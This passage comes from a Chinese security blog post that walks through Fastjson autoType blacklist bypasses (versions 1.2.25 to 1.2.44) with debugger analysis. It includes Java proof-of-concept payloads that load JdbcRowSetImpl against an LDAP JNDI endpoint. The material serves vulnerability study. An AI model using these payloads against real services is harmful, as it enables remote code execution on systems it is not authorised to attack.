alt="image-20231013173642089"></p><p>很显然我这里做了两点改变，首先是在 com.sun.rowset.JdbcRowSetImpl 前后分别加上的 L ；，然后又通过 ParserConfig.<em>getGlobalInstance</em> ().setAutoTypeSupport (true); 设置了 AutoTypeSupport 为 ture</p><h5 id="调试-5"><a class="anchor" href="#调试-5">#</a> 调试</h5><p>这里还是来调试看一下，它是怎么绕过，又是怎么处理这个 [和；这两个符号的</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20231013185103399.png" alt="image-20231013185103399"></p><p>还是将断点下在这里</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20231013180840441.png" alt="image-20231013180840441"></p><p>这里一路调试到 checkAutoType（前面的流程是没有变化的，这里不在重复记录）</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20231013181000229.png" alt="image-20231013181000229"></p><p>这里我觉得值得注意的也就这三个地方，AutoTypeSupport 是开启的状态，黑名单，以及传入的参数（我们要记在的目标类），首先它判断传入的参数是否为空，这里显然不是，就直接跳过</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20231013181207912.png" alt="image-20231013181207912"></p><p>接着这里进行一个替换，将 <code>typeName</code> 中的 <code>$</code> 替换为 <code>.</code> ，这里是对调用内部类的情况进行一个处理</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20231013181410828.png" alt="image-20231013181410828"></p><p>满足条件 AutoTypeSupport 是开启的状态进入到循环，然后白名单的校验，这里白名单是空的，所以本方法的第一个类加载显然是调用不到</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20231013181759176.png" alt="image-20231013181759176"></p><p>然后是黑名单的校验，这里使用 startsWith 来检查字符串的开头部分，所以这里是不会被黑名单检测出来</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20231013182008417.png" alt="image-20231013182008417"></p><p>这里分别到缓存和 deserializers 中去加载，很显然也是加载不到的</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20231013182103866.png" alt="image-20231013182103866"></p><p>因为类到目前为止都没有加载到而且前面也说到 AutoTypeSupport 是开启的状态，所以这里两个 if 语句都是进不去的</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20231013182300184.png" alt="image-20231013182300184"></p><p>终于在这个方法的最后一处加载的机会这里成功调用了 loadClass 方法，跟进到这个方法</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20231013182445211.png" alt="image-20231013182445211"></p><p>首先尝试在映射中寻找目标类，这里首字符是 L 所以会进入到我打断点的这个 if 语句中，可以看到这里做了一次截取将第一个和最后一个字符去掉，然后调用了一个 loadClass</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20231013184331962.png" alt="image-20231013184331962"></p><p>这里可以看到，已经被正常加载了后面的流程就和前面类加载之后的部分一样了，这里也不在赘述</p><h5><a class="anchor" href="#">#</a> [</h5><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20231013182445211.png" alt="image-20231013182445211"></p><p>在上面的调试中，当调试到这里，我发现当第一个字符是 [的时候似乎也有一些处理，这里先通过截取去掉了’[‘，然后调用了 loadClass，然后使用 <code>componentType</code> 创建一个长度为 0 的数组，并获取该数组的 <code>Class</code> 对象。</p><figure class="highlight java"><figcaption data-lang="java"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">public</span> <span class="token keyword">class</span> poc25to41JNI <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="2"></td><td><pre>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token comment">//        String str = "&#123;\"@type\":\"Lcom.sun.rowset.JdbcRowSetImpl;\",\"DataSourceName\":\"ldap://127.0.0.1:8087/T\",\"AutoCommit\":false&#125;";</span></pre></td></tr><tr><td data-num="4"></td><td><pre>        <span class="token class-name">String</span> str <span class="token operator">=</span> <span class="token string">"&#123;\"@type\":\"[com.sun.rowset.JdbcRowSetImpl\",\"DataSourceName\":\"ldap://127.0.0.1:8087/T\",\"AutoCommit\":false&#125;"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="5"></td><td><pre>        <span class="token class-name">ParserConfig</span><span class="token punctuation">.</span><span class="token function">getGlobalInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">setAutoTypeSupport</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="6"></td><td><pre>        <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parseObject</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>这里先使用这个 [尝试一下</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20231013192417130.png" alt="image-20231013192417130"></p><h5 id="调试寻找报错原因"><a class="anchor" href="#调试寻找报错原因">#</a> 调试寻找报错原因</h5><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20231013192550029.png" alt="image-20231013192550029"></p><p>这里调试到这个地方，可以看到进入到这个对于 [的判断</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20231013192630536.png" alt="image-20231013192630536"></p><p>这里类加载后是出去 [后的，跟进<em> newInstance</em> 方法</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20231013192753953.png" alt="image-20231013192753953"></p><p>创建一个长度为 0 的数组就 return 了</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20231013193511331.png" alt="image-20231013193511331"></p><p>调出来后看到这里 clazz 现在是 [com.sun.rowset.jdbcRowSetImpl</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20231013193824693.png" alt="image-20231013193824693"></p><p>这里直接跳出这个方法，其他没有值得要关注的地方</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20231013193846920.png" alt="image-20231013193846920"></p><p>一直走到这个方法，跟进</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20231013194214626.png" alt="image-20231013194214626"></p><p>这里调用的是 ObjectArrayCodec 的 deserialze 方法，很显然是因为前面创建的数组</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20231013194526884.png" alt="image-20231013194526884"></p><p>这进行两次 token 的判断</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20231013194621960.png" alt="image-20231013194621960"></p><p>根据这个表，当前的这个 token 是 16（就是这个类名后面的这个 &quot;,&quot;），然后判断是不是 GenericArrayType 的一个实例</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20231013194831843.png" alt="image-20231013194831843"></p><p>这里通过 getComponentType 对类名进行了处理，但是这里是一个本地方法没法调试，这里可以看到处理后去掉了我们加上多余的字符，跟进这个 parseArray 方法</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20231013195001556.png" alt="image-20231013195001556"></p><p>这里可以看到刚刚的报错的内容</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20231013195625560.png" alt="image-20231013195625560"></p><p>当前是 16，这里判断如果不等于 14 就会抛出异常，解决的方式也很简单，在 &quot;,&quot; 前面加上 [即可</p><figure class="highlight java"><figcaption data-lang="java"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">public</span> <span class="token keyword">class</span> poc25to41JNI <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="2"></td><td><pre>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token comment">//        String str = "&#123;\"@type\":\"Lcom.sun.rowset.JdbcRowSetImpl;\",\"DataSourceName\":\"ldap://127.0.0.1:8087/T\",\"AutoCommit\":false&#125;";</span></pre></td></tr><tr><td data-num="4"></td><td><pre>        <span class="token class-name">String</span> str <span class="token operator">=</span> <span class="token string">"&#123;\"@type\":\"[com.sun.rowset.JdbcRowSetImpl\"[,\"DataSourceName\":\"ldap://127.0.0.1:8087/T\",\"AutoCommit\":false&#125;"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="5"></td><td><pre>        <span class="token class-name">ParserConfig</span><span class="token punctuation">.</span><span class="token function">getGlobalInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">setAutoTypeSupport</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="6"></td><td><pre>        <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parseObject</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20231013195839474.png" alt="image-20231013195839474"></p><p>又出现了新的报错</p><h5 id="第二次调试"><a class="anchor" href="#第二次调试">#</a> 第二次调试</h5><p>这里出现了一个报错，在第 43 个位置遇到了一个字符串而不是预期的代码块（花括号 <code>&#123;&#125;</code> ）。简单来所就是花括号成对出现就可以了</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20231013200128224.png" alt="image-20231013200128224"></p><p>这里根据报错直接将这个逗号换为花括号即可</p><figure class="highlight java"><figcaption data-lang="java"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">public</span> <span class="token keyword">class</span> poc25to41JNI <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="2"></td><td><pre>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token comment">//        String str = "&#123;\"@type\":\"Lcom.sun.rowset.JdbcRowSetImpl;\",\"DataSourceName\":\"ldap://127.0.0.1:8087/T\",\"AutoCommit\":false&#125;";</span></pre></td></tr><tr><td data-num="4"></td><td><pre>        <span class="token class-name">String</span> str <span class="token operator">=</span> <span class="token string">"&#123;\"@type\":\"[com.sun.rowset.JdbcRowSetImpl\"[&#123;\"DataSourceName\":\"ldap://127.0.0.1:8087/T\",\"AutoCommit\":false&#125;"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="5"></td><td><pre>        <span class="token class-name">ParserConfig</span><span class="token punctuation">.</span><span class="token function">getGlobalInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">setAutoTypeSupport</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="6"></td><td><pre>        <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parseObject</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>重新调试一下</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20231013200508836.png" alt="image-20231013200508836"></p><p>这里将逗号换为花括号与后面那个花括号匹配后这里不在抛出异常</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20231013200602499.png" alt="image-20231013200602499"></p><p>这里会一直走到这个地方，跟进这个方法</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20231013200643176.png" alt="image-20231013200643176"></p><p>调用 JavaBeanDeserializer 的 deserialze 方法</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20231013200721141.png" alt="image-20231013200721141"></p><p>这里也是看到了刚刚出现报错的地方</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20231013201348528.png" alt="image-20231013201348528"></p><p>这里看一下最外层的判断，如果下一个字符不是，左大括号 <code>&#123;</code> 或逗号 <code>,</code> ，它会进一步检查是否是空白输入，这里使用 {即可</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20231013201745265.png" alt="image-20231013201745265"></p><p>经过一系列的判断后，实际上是到这个位置</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20231013201917923.png" alt="image-20231013201917923"></p><p>到这里期间的没有别的问题，一路调用</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20231013201948654.png" alt="image-20231013201948654"></p><p>继续跟进</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20231013202007701.png" alt="image-20231013202007701"></p><p>一直到这个方法的 setvalue 方法才算是结束了，后面的就和前面调试过程一样了</p><h4 id="mappings"><a class="anchor" href="#mappings">#</a> mappings</h4><p>很显然上面的利用中，需要开启 autoType，这显然是有很强的限制条件的，很显然我们想要是一种限制条件更加少的利用方式，也就是下面要记录的这种，上一种方式使用的是 loadClass 来加载类，但是由于黑白名单的限制，很显然想要直接绕过是比较困难的</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20231013210200978.png" alt="image-20231013210200978"></p><p>这里有一个从缓存中获取类的方法，这里就是我们现在要利用的突破口</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20231013210450374.png" alt="image-20231013210450374"></p><p>这里是从<em> mappings</em> 中去寻找，这里看一些哪里可以给这个 mappings 赋值</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20231013210951110.png" alt="image-20231013210951110"></p><p>这里先看第一处</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20231013211036095.png" alt="image-20231013211036095"></p><p>在这个 TypeUtils 这个类中会将基础类型添加进缓存，然后将异常类定义为一个 class 数组</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20231013211205774.png" alt="image-20231013211205774"></p><p>最后通过循环也添加进缓存，这里都是硬编码的部分是没法控制的，接着看第二处</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20231013211311957.png" alt="image-20231013211311957"></p><p>还是在这个类下的 loadclass 方法中，这里这样写是为了提高效率，已经加载的类放入缓存中不必重新加载，这里只需要我们想办法先将恶意类加载到缓存中就可以了，接着找哪里可控调用了这个 loadClass 方法</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20231013211733576.png" alt="image-20231013211733576"></p><p>这里找了一下哪里调用了这个 loadClass 方法，这里实际上可用的只有这个 com.alibaba.fastjson.serializer.MiscCodec 的 deserialze 方法里有可操作的空间</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20231013211946404.png" alt="image-20231013211946404"></p><p>这个类实现了 ObjectSerializer，ObjectDeserializer 所以他是一个序列化，反序列化器</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20231014195731732.png" alt="image-20231014195731732"></p><p>这里会调用 TypeUtils 的 loadClass 方法，这里回头查看一下哪里使用了这个序列化反序列化器</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20231014185401945.png" alt="image-20231014185401945"></p><p>在 ParserConfig 这个类里，会将这个序列化器和对应的类 put 进 deserializers，简单来所就是这里一些内置的类会定义好用哪个序列化器进行序列化和返序列化</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20231014191424672.png" alt="image-20231014191424672"></p><p>这里就比较熟悉了，在 conf 中去获取类加载器，根据类名</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20231014191529453.png" alt="image-20231014191529453"></p><p>conf 中存在前面 deserializers，根据这个来获取序列化器，然后再通过这个序列化器来进行序列化</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20231014191750656.png" alt="image-20231014191750656"></p><p>在 checkAutoType 中存在一个<em> getClassFromMapping</em> 方法</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20231014191831152.png" alt="image-20231014191831152"></p><p>这里会从缓存中获取这个类</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20231014191941769.png" alt="image-20231014191941769"></p><p>这里就会添加到 mapping 中，漏洞点实际上就比较简单了，首先加载一个恶意类到缓存中，然后再 checkAutoType 会从缓存中获取到这个恶意类来达到我们的目的</p><p>先看下面这个示例</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20231014221632484.png" alt="image-20231014221632484"></p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20231014194329500.png" alt="image-20231014194329500"></p><h5 id="调试-6"><a class="anchor" href="#调试-6">#</a> 调试</h5><p>这里还是调试看一下</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20231014200240317.png" alt="image-20231014200240317"></p><p>断点还是下在老位置</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20231014201944667.png" alt="image-20231014201944667"></p><p>这里因为第一个 token 是 {，所以会调用 parse 这个方法</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20231014200442103.png" alt="image-20231014200442103"></p><p>前面的其他调试这里也不在啰嗦，就出现了上面那一点变化，这里直接到第一次调用这个这个 checkAutoType 方法，传入的 typename 是 java.lang.class 类</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20231014200813177.png" alt="image-20231014200813177"></p><p>这个类不会被黑名单过滤，所以这里会走到这个 findClass 方法，这里是一个内置类，是有对应的反序列化器的</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20231014200932401.png" alt="image-20231014200932401"></p><p>所以这里会被加载到，就退出了</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20231014201001452.png" alt="image-20231014201001452"></p><p>可以看到当前的类是 Class</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20231014201033117.png" alt="image-20231014201033117"></p><p>这里检查下一个 token</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20231014201140207.png" alt="image-20231014201140207"></p><p>这里根据 class 这个类寻找对应的反序列化器，就是这个 MiscCode</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20231014201231713.png" alt="image-20231014201231713"></p><p>调用这个 MiscCode 的 deserialze 方法</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20231014201349108.png" alt="image-20231014201349108"></p><p>这里会判断第二个参数，如果不为 val 会抛出异常</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20231014201633066.png" alt="image-20231014201633066"></p><p>经过一系列的判断，最后会走到这个 TypeUtils.<em>loadClass</em> 方法，跟进一下</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20231014201746471.png" alt="image-20231014201746471"></p><p>在缓存中肯定是找不到的</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20231014201815892.png" alt="image-20231014201815892"></p><p>这里会调用到这样一个方法，将我们的恶意类加入的缓存中</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20231014202107136.png" alt="image-20231014202107136"></p><p>这里因为第二个 @type 的存在，会第二次走到这个 checkAutoType 这个类中</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20231014202220577.png" alt="image-20231014202220577"></p><p>这时能够从缓存中获取这个类，然后后面的流程也就一样了</p><h3 id="fastjson1242"><a class="anchor" href="#fastjson1242">#</a> fastjson=1.2.42</h3><p>这个版本中黑名单由明文变为了加密后的，前面的 poc 也只有一种使用 L; 绕过的方式受到了影响</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20231014212118548.png" alt="image-20231014212118548"></p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20231014212054904.png" alt="image-20231014212054904"></p><p>在黑名单的校验后，还将第一个字符和最后一个字符去了，绕过也很简单，双写即可</p><figure class="highlight java"><figcaption data-lang="java"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">public</span> <span class="token keyword">class</span> poc42 <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="2"></td><td><pre>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>        <span class="token class-name">String</span> str <span class="token operator">=</span> <span class="token string">"&#123;\"@type\":\"LLcom.sun.rowset.JdbcRowSetImpl;;\",\"DataSourceName\":\"ldap://127.0.0.1:8087/T\",\"AutoCommit\":false&#125;"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token comment">//      String str = "&#123;\"@type\":\"[com.sun.rowset.JdbcRowSetImpl\"[&#123;\"DataSourceName\":\"ldap://127.0.0.1:8087/T\",\"AutoCommit\":false&#125;";</span></pre></td></tr><tr><td data-num="5"></td><td><pre>        <span class="token class-name">ParserConfig</span><span class="token punctuation">.</span><span class="token function">getGlobalInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">setAutoTypeSupport</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="6"></td><td><pre>        <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parseObject</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><h3 id="fastjson1243"><a class="anchor" href="#fastjson1243">#</a> fastjson=1.2.43</h3><p>这里还是看到这个 checkAutoType 方法</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20231014212643507.png" alt="image-20231014212643507"></p><p>这里对开头是两个 L 的做了一次判断，所以就不能再使用双写 L 的方式，这里还能使用前面的 mapping 和 [的方式</p><h3 id="fastjson1244"><a class="anchor" href="#fastjson1244">#</a> fastjson=1.2.44</h3><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20231014213031078.png" alt="image-20231014213031078"></p><p>对开始位置是 [也做了现在，还能使用前面说到的 mapping 缓存的利用方式即可</p><div class="tags"><a href="/tags/FastJson/" rel="tag"><i class="ic i-tag"></i> FastJson</a></div></div><footer><div class="meta"><span id="2023/10/14/java安全/FastJSON反序列化漏洞/" class="item leancloud_visitors" data-flag-title="FastJson漏洞分析" title="阅读次数"><span class="icon"><i class="ic i-eye"></i> </span><span class="text">阅读次数</span> <span class="leancloud-visitors-count"></span> <span class="text">次</span></span></div><div id="copyright"><ul><li class="author"><strong>本文作者： </strong>Clown <i class="ic i-at"><em>@</em></i></li><li class="link"><strong>本文链接：</strong> <a href="https://blog.xcu.icu/2023/10/14/java%E5%AE%89%E5%85%A8/FastJSON%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" title="FastJson漏洞分析">https://blog.xcu.icu/2023/10/14/java安全/FastJSON反序列化漏洞/</a></li><li class="license"><strong>版权声明： </strong>本站所有文章除特别声明外，均采用 <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</span> 许可协议。转载请注明出处！</li></ul></div></footer></article></div><div class="post-nav"><div class="item left"><a href="/2023/10/03/pwn/%E6%9E%84%E9%80%A0shellcode%EF%BC%88%E6%B0%B4%E8%B4%A7%E6%BB%A1%E6%BB%A1%EF%BC%89/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;note-1311335427.cos.ap-shanghai.myqcloud.com&#x2F;images&#x2F;96.jpg" title="构造Shellcode（水货满满）"><span class="type">上一篇</span> <span class="category"><i class="ic i-flag"></i> PWN</span><h3>构造Shellcode（水货满满）</h3></a></div><div class="item right"><a href="/2023/10/17/Vulnhub/VulnHub-DC%E7%AF%87DC-1/" itemprop="url" rel="next" data-background-image="https:&#x2F;&#x2F;note-1311335427.cos.ap-shanghai.myqcloud.com&#x2F;images&#x2F;67.jpg" title="DC-1"><span class="type">下一篇</span> <span class="category"><i class="ic i-flag"></i> Vulnhub</span><h3>DC-1</h3></a></div></div><div class="wrap" id="comments"></div></div><div id="sidebar"><div class="inner"><div class="panels"><div class="inner"><div class="contents panel pjax" data-title="文章目录"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#fastjson"><span class="toc-number">2.</span> <span class="toc-text">Fastjson</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BA%A7%E7%94%9F%E6%A0%B9%E6%BA%90"><span class="toc-number">3.</span> <span class="toc-text">漏洞产生根源</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90"><span class="toc-number">3.1.</span> <span class="toc-text">调试分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E5%86%B3%E4%B8%8D%E8%83%BD%E8%B0%83%E8%AF%95%E9%97%AE%E9%A2%98"><span class="toc-number">3.2.</span> <span class="toc-text">解决不能调试问题</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B0%83%E6%95%B4%E5%90%8E%E7%9A%84%E8%B0%83%E8%AF%95"><span class="toc-number">3.3.</span> <span class="toc-text">调整后的调试</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#demo"><span class="toc-number">3.4.</span> <span class="toc-text">demo</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#fastjson1246%E7%89%88%E6%9C%AC%E5%A4%8D%E7%8E%B0"><span class="toc-number">4.</span> <span class="toc-text">fastjson&lt;&#x3D;1.2.46 版本复现</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#fastjson1224"><span class="toc-number">4.1.</span> <span class="toc-text">Fastjson&lt;&#x3D;1.2.24</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#jdbcrowsetimpl"><span class="toc-number">4.1.1.</span> <span class="toc-text">JdbcRowSetImpl</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%B0%83%E8%AF%95"><span class="toc-number">4.1.1.1.</span> <span class="toc-text">调试</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#templatesimpl"><span class="toc-number">4.1.2.</span> <span class="toc-text">TemplatesImpl</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%B0%83%E8%AF%95-2"><span class="toc-number">4.1.2.1.</span> <span class="toc-text">调试</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#bcel"><span class="toc-number">4.1.3.</span> <span class="toc-text">Bcel</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%B0%83%E8%AF%95-3"><span class="toc-number">4.1.3.1.</span> <span class="toc-text">调试</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D"><span class="toc-number">4.1.4.</span> <span class="toc-text">修复</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%B0%83%E8%AF%95-4"><span class="toc-number">4.1.4.1.</span> <span class="toc-text">调试</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1225-fastjson-1241-bypass"><span class="toc-number">4.2.</span> <span class="toc-text">1.2.25&lt;&#x3D; Fastjson &lt;&#x3D; 1.2.41 Bypass</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" 